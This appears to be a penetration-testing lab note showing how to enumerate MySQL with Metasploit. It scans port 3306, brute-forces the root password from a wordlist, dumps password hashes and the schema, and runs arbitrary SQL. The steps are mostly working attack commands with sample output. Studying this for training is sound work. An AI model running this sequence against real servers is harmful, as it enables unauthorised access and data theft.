## What is MySQL?

Open source relational database management system using SQL (Structured Query Language). Commonly used to store web application data (e.g. WordPress). Runs on **TCP port 3306** by default.

## MySQL Enumeration Workflow

**Step 1 — Confirm MySQL is running**

```bash
use auxiliary/scanner/portscan/tcp
run
# Result: port 3306 open
```

**Step 2 — Identify MySQL version**

```bash
use auxiliary/scanner/mysql/mysql_version
run
# Result: MySQL 5.5.61 on Ubuntu 14.04
```

**Step 3 — Brute force credentials**

```bash
use auxiliary/scanner/mysql/mysql_login
set USERNAME root          # target root user directly
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
# Result: root : twinkle
```

**Step 4 — Enumerate database info (requires credentials)**

```bash
use auxiliary/admin/mysql/mysql_enum
set PASSWORD twinkle
set USERNAME root
run
# Result: version, hostname, OS, user accounts + hashes, privileges
```

**Step 5 — Execute SQL queries**

```bash
use auxiliary/admin/mysql/mysql_sql
set PASSWORD twinkle
set USERNAME root
set SQL show databases;
run
# Result: mysql, upload, vendors, videos, warehouse...
 
set SQL use videos;
run
```

**Step 6 — Dump full database schema**

```bash
use auxiliary/admin/mysql/mysql_schemadump
set PASSWORD twinkle
set USERNAME root
run
# Result: all databases + their tables listed
```

**Step 7 — Connect directly (outside MSF)**

```bash
mysql -h <target_ip> -u root -p
# Password: twinkle
show databases;
use videos;
show tables;
```

|Module|Purpose|
|---|---|

|`mysql_enum`|Users, hashes, privileges (requires creds)|
|`mysql_sql`|Execute arbitrary SQL queries|
|`mysql_schemadump`|Full database/table schema dump|
